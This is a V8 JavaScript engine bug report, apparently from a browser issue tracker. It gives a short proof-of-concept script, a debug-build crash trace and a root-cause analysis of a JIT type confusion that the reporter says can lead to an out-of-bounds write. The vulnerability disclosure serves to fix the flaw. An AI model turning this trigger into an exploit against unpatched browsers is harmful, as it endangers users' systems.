Note: This is a child bug of issue 941624

Original reporter: l.dmxcsnsbh@gmail.com 

# V8 Bug Details Here 

## PoC 

``` 
// Impact version: 6.1.462+ 
var arr = [1]; 
for (var i = 1; i < 30; ++i) {  
    var a2 = arr.map(function(){arr.push(2);}); 
    arr.some(arr.constructor);  
    for (var j = 0; j < 10000; ++j) {} 
} 
``` 

It can trigger DCHECK failure: 

``` 
# 
# Fatal error in ../../src/elements.cc, line 882 
# Debug check failed: IsFastElementsKind(from_kind). 
# 
# 
# 
#FailureMessage Object: 0x7ffeefbfe7b0 
==== C stack trace =============================== 

    0   libv8_libbase.dylib                 0x00000001022381e3 v8::base::debug::StackTrace::StackTrace() + 19 
    1   libv8_libplatform.dylib             0x0000000102261f29 v8::platform::(anonymous namespace)::PrintStackTrace() + 41 
    2   libv8_libbase.dylib                 0x000000010222d805 V8_Fatal(char const*, int, char const*, ...) + 325 
    3   libv8_libbase.dylib                 0x000000010222d335 v8::base::(anonymous namespace)::DefaultDcheckHandler(char const*, int, char const*) + 21 
    4   libv8.dylib                         0x0000000100925d58 v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastHoleyObjectElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)3> >::TransitionElementsKind(v8::internal::Handle<v8::internal::JSObject>, v8::internal::Handle<v8::internal::Map>) + 440 
    5   libv8.dylib                         0x0000000100e978d4 v8::internal::__RT_impl_Runtime_TransitionElementsKind(v8::internal::Arguments, v8::internal::Isolate*) + 308 
    6   libv8.dylib                         0x0000000101569d69 Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit + 73 
``` 

|from_kind| is dictionay here.  

In release version, |TransitionElementsKind| will transit this dictianary elements to holey, since it regard it is a fast transition, nothing will change except map. So type confusion occurs.  

It can also lead to oob-write: at this time the loop count is equal to arr.length which is 0x4000000, but the dictionary elementsâ€™ length is only 0x10.  

## Root Cause 

1. The optimization of JSCreateArray (for |a2|) bailout at typed lowering phase. When executing JITed code, it calls to |Runtime_NewArray|. 
2. There's a CheckMaps for |arr|, but it can't ensure an array that produced by |arr| is the same type. For example, |arr| is extended by |push| and it has PACKED_SMI_ELEMENTS, but |a2| could be constructed by |Runtime_NewArray| and it could have DICTIONARY_ELEMENTS. 
3. TransitionAndStoreElement assumes the source array should be HOLEY_SMI_ELEMENTS, this can't ensure either. Because when calling to |Runtime_NewArray| and array's actual length >= 0x4000000, there'll be a dictionary elements array. So our bug occurs.